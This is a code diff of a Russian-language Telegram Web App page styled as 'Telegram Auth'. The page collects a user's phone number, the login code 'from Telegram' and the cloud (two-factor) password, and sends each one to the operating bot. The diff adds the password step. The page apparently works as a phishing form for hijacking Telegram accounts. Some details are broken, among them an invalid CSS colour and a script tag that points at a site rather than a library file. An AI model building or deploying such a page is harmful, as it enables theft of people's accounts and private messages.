@@ -1,62 +1,59 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <!-- Подключаем библиотеку Telegram -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Auth</title>
     <script src="https://telegram.org"></script>
     <style>
-        body { font-family: sans-serif; background: var(--tg-theme-bg-color, #fff); color: var(--tg-theme-text-color, #000); display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .step { display: none; width: 90%; text-align: center; }
-        .active { display: block; }
-        input { width: 85%; padding: 15px; margin: 15px 0; border-radius: 12px; border: 1px solid #ccc; font-size: 18px; }
-        button { width: 90%; padding: 15px; border-radius: 12px; border: none; background: var(--tg-theme-button-color, #248bcf); color: var(--tg-theme-button-text-color, #fff); font-weight: bold; cursor: pointer; }
+        body { font-family: sans-serif; text-align: center; padding: 20px; background: #fff; }
+        input { width: 80%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 85%; padding: 10px; background: #0088cc; color: #white; border: none; border-radius: 5px; cursor: pointer; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-
-    <div id="step1" class="step active">
-        <h2>Вход</h2>
-        <input type="tel" id="phone" placeholder="79001234567">
-        <button onclick="sendData('phone')">Продолжить</button>
+    <div id="phone-step">
+        <h3>Введите номер телефона</h3>
+        <input type="text" id="phone" placeholder="+79991234567">
+        <button onclick="sendPhone()">Продолжить</button>
     </div>
 
-    <div id="step2" class="step">
-        <h2>Введите код</h2>
-        <input type="number" id="code" placeholder="12345">
-        <button onclick="sendData('code')">Войти</button>
+    <div id="code-step" class="hidden">
+        <h3>Введите код из Telegram</h3>
+        <input type="text" id="code" placeholder="12345">
+        <button onclick="sendCode()">Войти</button>
     </div>
 
-    <!-- ВОТ ЗДЕСЬ ИСПОЛЬЗУЕТСЯ JAVASCRIPT -->
+    <div id="password-step" class="hidden">
+        <h3>Введите облачный пароль</h3>
+        <input type="password" id="password" placeholder="Пароль">
+        <button onclick="sendPassword()">Подтвердить</button>
+    </div>
+
     <script>
-        // Инициализация объекта Telegram Web App
-        var tg = window.Telegram.WebApp;
+        const tg = window.Telegram.WebApp;
         tg.expand();
-        tg.ready();
 
-        function sendData(type) {
-            try {
-                var inputId = (type === 'phone') ? 'phone' : 'code';
-                var value = document.getElementById(inputId).value.trim();
-
-                if (!value) {
-                    tg.showAlert("Поле не может быть пустым!");
-                    return;
-                }
-
-                // Отправка данных боту (только если открыто через KeyboardButton)
-                tg.sendData(type + ":" + value);
-                
-                if (type === 'phone') {
-                    document.getElementById('step1').classList.remove('active');
-                    document.getElementById('step2').classList.add('active');
-                } else {
-                    tg.close();
-                }
-            } catch (e) {
-                alert("Ошибка: " + e.message + "\nУбедитесь, что запустили через кнопку в чате!");
-            }
+        function sendPhone() {
+            const phone = document.getElementById('phone').value;
+            tg.sendData("phone:" + phone);
+            document.getElementById('phone-step').classList.add('hidden');
+            document.getElementById('code-step').classList.remove('hidden');
         }
+
+        function sendCode() {
+            const code = document.getElementById('code').value;
+            tg.sendData("code:" + code);
+        }
+
+        function sendPassword() {
+            const pwd = document.getElementById('password').value;
+            tg.sendData("password:" + pwd);
+        }
+
+        // Если бот пришлет ошибку пароля, можно вручную переключить шаг
+        // (Для упрощения в этом примере переключение логикой бота)
     </script>
 </body>
 </html>
